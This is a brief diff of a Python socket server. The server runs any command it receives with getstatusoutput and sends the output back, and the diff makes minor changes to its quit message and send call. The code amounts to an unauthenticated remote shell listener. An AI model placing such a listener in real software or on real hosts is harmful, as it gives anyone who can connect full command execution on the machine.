@@ -22,12 +22,12 @@ def server(ip : str):
             command = data.decode('utf-8')
             
             if command.strip() == 'quit':
-                #conn.send(b'disconnecting...')
+                conn.send(b'disconnecting...')
                 conn.close()
 
             else:
                 info = getstatusoutput(command)
-                conn.send(dumps(info))
+                conn.sendall(dumps(info))
 
 if __name__ == '__main__':
     ## Execution begins here.
